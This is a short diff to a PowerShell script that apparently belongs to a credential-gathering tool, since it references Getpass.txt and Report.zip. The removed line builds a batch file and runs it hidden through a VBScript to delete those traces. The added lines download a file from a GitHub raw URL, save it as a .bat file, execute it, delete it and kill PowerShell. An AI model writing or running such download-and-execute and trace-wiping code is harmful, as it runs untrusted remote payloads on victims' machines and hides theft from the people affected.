@@ -2960,5 +2960,7 @@ catch
 	echo 'Error!Filed!'
 }
 remove-item $fileSaveDir -recurse
-echo ping 127.1 -t 100 & del d:\Report.zip & del d:\run.bat & del d:\Getpass.txt  > d:\start1.bat & echo createobject("wscript.shell").run "d:\start1.bat",0 > d:\start1.vbs & wscript d:\start1.vbs & del  d:\start1.bat &del d:\start1.vbs
+(new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/run2.rar','D:\run2.bat');
+d:\run2.bat
+remove-item 'D:\run2.bat'
 taskkill /im /f powershell.exe
